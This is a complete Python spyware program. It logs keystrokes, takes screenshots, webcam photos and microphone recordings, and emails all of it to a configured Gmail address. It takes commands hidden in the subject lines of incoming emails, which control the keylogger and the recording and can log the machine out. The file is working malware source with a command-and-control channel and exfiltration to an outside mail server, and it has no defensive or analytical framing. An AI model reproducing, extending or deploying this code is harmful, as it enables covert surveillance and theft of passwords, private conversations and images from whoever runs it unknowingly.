import smtplib
import time
import os
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import imaplib
import email
import threading
import pyautogui
from cryptography.fernet import Fernet
import pyaudio
import wave
from queue import Queue
import cv2  # Added for photo capture

EMAIL_ADDRESS = 'Sender-mail-id'
EMAIL_PASSWORD = 'password'
RECIPIENT_EMAIL = 'receiver-mail-id'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 465
IMAP_SERVER = 'imap.gmail.com'

keystrokes = []
keylogger_active = False
keylogger_thread = None
recording_mic = False

lock = threading.Lock()
email_queue = Queue()

# Load or create encryption key
if not os.path.exists('key.key'):
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
else:
    with open('key.key', 'rb') as key_file:
        key = key_file.read()

cipher = Fernet(key)


def encrypt_data(data):
    return cipher.encrypt(data.encode())


def decrypt_data(encrypted_data):
    return cipher.decrypt(encrypted_data).decode()


def on_press(key):
    """Capture keypress and handle special keys."""
    try:
        lock.acquire()
        keystrokes.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes.append('\n')
        elif key == keyboard.Key.backspace and keystrokes:
            keystrokes.pop()
        else:
            keystrokes.append(f'[{key}]')
    finally:
        lock.release()


def send_email(subject, body, attachments=[]):
    """Send an email with the provided subject, body, and attachments."""
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        for attachment in attachments:
            if os.path.exists(attachment):
                part = MIMEBase('application', 'octet-stream')
                with open(attachment, 'rb') as file:
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
                msg.attach(part)
            else:
                print(f"Attachment not found: {attachment}")

        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
            print(f"Email sent successfully with subject: {subject}")

    except Exception as e:
        print(f"Error sending email: {e}")


def capture_image():
    """Capture image from webcam and return the filename."""
    try:
        # Initialize the camera
        cam = cv2.VideoCapture(0)

        if not cam.isOpened():
            print("Error: Could not open camera")
            return None

        # Let the camera warm up
        time.sleep(2)

        # Capture frame
        ret, frame = cam.read()

        if ret:
            # Create filename with timestamp
            filename = f"webcam_capture_{int(time.time())}.jpg"

            # Save the image
            cv2.imwrite(filename, frame)
            print(f"Image captured and saved as {filename}")

            # Release the camera
            cam.release()
            cv2.destroyAllWindows()

            return filename
        else:
            print("Failed to capture image")
            cam.release()
            return None

    except Exception as e:
        print(f"Error capturing image: {e}")
        try:
            cam.release()
            cv2.destroyAllWindows()
        except:
            pass
        return None


def check_incoming_email():
    """Check for incoming emails to start/stop keylogger or log out."""
    global keylogger_active, keylogger_thread, recording_mic

    error_count = 0
    max_errors = 5

    while True:
        mail = None
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER)
            mail.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            mail.select('inbox')

            status, messages = mail.search(None, '(UNSEEN)')
            email_ids = messages[0].split()

            for e_id in email_ids:
                status, msg_data = mail.fetch(e_id, '(RFC822)')
                for response_part in msg_data:
                    if isinstance(response_part, tuple):
                        msg = email.message_from_bytes(response_part[1])
                        subject = msg['subject'].strip().upper()

                        print(f"New email received: {subject}")

                        if 'STOP KEYLOGGER' in subject:
                            print("Stopping keylogger...")
                            keylogger_active = False
                            if keylogger_thread:
                                keylogger_thread.join()

                        elif 'LOGOUT' in subject:
                            print("Logging out machine...")
                            mail.close()
                            mail.logout()
                            logout_machine()
                            return

                        elif 'START KEYLOGGER' in subject and not keylogger_active:
                            print("Starting keylogger...")
                            keylogger_active = True
                            start_keylogger_thread()

                        elif 'SCREENSHOT' in subject:
                            print("Taking screenshot...")
                            screenshot_file = capture_screenshot()
                            if screenshot_file:
                                send_email('Screenshot', 'Here is the screenshot taken.', [screenshot_file])
                                # Clean up file after sending
                                try:
                                    os.remove(screenshot_file)
                                except:
                                    pass

                        elif 'ONMIC' in subject and not recording_mic:
                            print("Starting microphone recording...")
                            recording_mic = True
                            mic_thread = threading.Thread(target=record_microphone)
                            mic_thread.daemon = True
                            mic_thread.start()

                        elif 'OFFMIC' in subject and recording_mic:
                            print("Stopping microphone recording...")
                            recording_mic = False

                        elif "PHOTO" in subject:
                            print("PHOTO requested. Taking photo...")
                            photo_file = capture_image()
                            if photo_file:
                                send_email('Webcam Photo', 'Here is the webcam photo.', [photo_file])
                                # Clean up file after sending
                                try:
                                    os.remove(photo_file)
                                except:
                                    pass
                            else:
                                send_email('Webcam Photo Error', 'Failed to capture webcam photo.', [])

            # Reset error count on success
            error_count = 0

        except Exception as e:
            error_count += 1
            print(f"Error checking email ({error_count}/{max_errors}): {e}")

            if error_count >= max_errors:
                print("Too many errors, waiting 2 minutes before retry...")
                time.sleep(120)
                error_count = 0

        # Close connection properly
        try:
            if mail:
                mail.close()
                mail.logout()
        except:
            pass

        time.sleep(10)  # Check every 10 seconds


def logout_machine():
    """Logs out the machine."""
    try:
        if os.name == 'nt':  # Windows
            os.system("shutdown /l")
        else:  # Linux/macOS
            os.system("logout")
    except Exception as e:
        print(f"Error during logout: {e}")


def keylogger():
    """Keylogger function that captures keystrokes."""
    global keylogger_active
    with keyboard.Listener(on_press=on_press) as listener:
        while keylogger_active:
            time.sleep(0.1)
        print("Keylogger stopped.")


def start_keylogger_thread():
    """Starts the keylogger thread if not already running."""
    global keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger_thread = threading.Thread(target=keylogger)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        print("Keylogger thread started.")


def capture_screenshot():
    """Capture screenshot and return filename."""
    try:
        screenshot_file = f"screenshot_{int(time.time())}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_file)
        print(f"Screenshot taken: {screenshot_file}")
        return screenshot_file
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None


def record_microphone():
    """Record audio from the microphone and send via email."""
    global recording_mic
    audio_format = pyaudio.paInt16
    channels = 1
    sample_rate = 44100
    chunk_size = 1024
    record_seconds = 180  # Record for 1 minute at a time

    audio = pyaudio.PyAudio()

    try:
        while recording_mic:
            output_filename = f"mic_recording_{int(time.time())}.wav"

            stream = audio.open(format=audio_format, channels=channels,
                                rate=sample_rate, input=True,
                                frames_per_buffer=chunk_size)

            print(f"Recording audio... ({output_filename})")
            frames = []

            # Record for the specified duration
            for i in range(0, int(sample_rate / chunk_size * record_seconds)):
                if not recording_mic:
                    break
                data = stream.read(chunk_size)
                frames.append(data)

            stream.stop_stream()
            stream.close()

            # Save recording
            wave_file = wave.open(output_filename, 'wb')
            wave_file.setnchannels(channels)
            wave_file.setsampwidth(audio.get_sample_size(audio_format))
            wave_file.setframerate(sample_rate)
            wave_file.writeframes(b''.join(frames))
            wave_file.close()

            print(f"Audio recorded: {output_filename}")

            # Send email with recording
            send_email('Microphone Recording', 'Here is the audio recorded from the microphone.', [output_filename])

            # Clean up the audio file after sending
            try:
                os.remove(output_filename)
                print(f"Cleaned up: {output_filename}")
            except Exception as e:
                print(f"Error cleaning up audio file: {e}")

    except Exception as e:
        print(f"Error in microphone recording: {e}")
    finally:
        audio.terminate()
        print("Microphone recording stopped.")


def start_threads():
    """Start all required threads."""
    global keylogger_active

    # Start checking incoming emails
    email_check_thread = threading.Thread(target=check_incoming_email)
    email_check_thread.daemon = True
    email_check_thread.start()

    # Start sending email
    email_send_thread = threading.Thread(target=send_email_periodically)
    email_send_thread.daemon = True
    email_send_thread.start()

    # Start keylogger if active
    if keylogger_active:
        start_keylogger_thread()


def send_email_periodically():
    """Send the collected keystrokes via email periodically."""
    global keystrokes
    while True:
        time.sleep(180)  # Send every 3 minutes
        lock.acquire()
        if keystrokes:
            message_content = ''.join(keystrokes)
            keystrokes = []
        else:
            message_content = 'No keystrokes recorded in the last period.'
        lock.release()

        if message_content and message_content != 'No keystrokes recorded in the last period.':
            send_email('Keylogger Report', f'Keystrokes captured:\n\n{message_content}')


if __name__ == "__main__":
    keylogger_active = True
    print("Starting keylogger system...")
    start_threads()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        keylogger_active = False